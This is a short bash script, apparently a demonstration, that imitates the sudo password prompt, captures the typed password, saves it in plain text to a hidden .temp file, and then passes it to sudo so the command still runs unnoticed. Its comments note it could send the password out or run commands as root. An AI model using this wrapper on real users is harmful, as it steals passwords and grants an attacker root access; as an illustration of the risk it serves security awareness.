#!/bin/bash

# This little program takes the user's password and stores it
# It COULD send it off to the internet if it wanted to
# It COULD also run arbitrary commands as root now
read -s -rep "[sudo] password for $USER: "
echo "$REPLY" > .temp
echo
echo "$REPLY" | sudo -S "$@"

